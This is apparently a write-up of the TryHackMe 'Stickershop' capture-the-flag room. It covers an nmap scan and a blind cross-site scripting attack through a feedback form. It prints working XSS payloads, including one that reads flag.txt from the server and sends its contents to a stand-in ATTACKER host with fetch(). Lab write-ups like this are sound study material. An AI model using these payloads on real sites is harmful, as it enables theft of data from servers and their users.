---
title: "Stickershop"
date: 2025-02-26
draft: false
summary: "Writeup for Stickershop CTF challenge on TryHackMe."
tags: ["web", "ssrf"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/stickershop/cover.webp"
  caption: "Stickershop TryHackMe Challenge"
  alt: "Stickershop cover"
platform: "TryHackMe"
---

Can you exploit the sticker shop in order to capture the flag?
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/thestickershop

## Reconnaissance

I performed an **nmap** aggressive scan to identify open ports and the services running on the target.

```shell
nmap -A -p- TARGET -oN stickershop.nmap --min-rate 10000
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 8080     | http        |

![](https://cdn.ziomsec.com/stickershop/1.webp)

## Capturing The Flag

Since I already had the path to flag, I tried accessing it directly.

![](https://cdn.ziomsec.com/stickershop/2.webp)

I did not have the appropriate permissions, so I visited the web site hosted on the target.

![](https://cdn.ziomsec.com/stickershop/3.webp)

The site contained a feedback field at `/submit_feedback`

![](https://cdn.ziomsec.com/stickershop/4.webp)

I tried executing a cross site scripting payload.

```
<img src="a" onerror="alert(1)">
```

![](https://cdn.ziomsec.com/stickershop/5.webp)

My XSS payload worked, hence I modified my payload to make the server send a request to my local machine.

```
<img src="nonexistent-image.jpg" onerror="fetch('http://ATTACKER')" />
```

![](https://cdn.ziomsec.com/stickershop/6.webp)

Upon execution, my local machine received a GET request from the server.

![](https://cdn.ziomsec.com/stickershop/7.webp)

Hence, I used the below payload to make the server get the data from *flag.txt* and then send it to my local machine through a GET request.

```
<img src='a' onerror='fetch("http://127.0.0.1:8080/flag.txt").then(r=>r.text()).then(d=>fetch("http://ATTACKER?data="+encodeURIComponent(d))).catch(e=>console.error(e));
```

![](https://cdn.ziomsec.com/stickershop/8.webp)

Upon execution, I successfully received the value of the flag.

![](https://cdn.ziomsec.com/stickershop/9.webp)

That's it from my end :)
Happy Hacking !

---
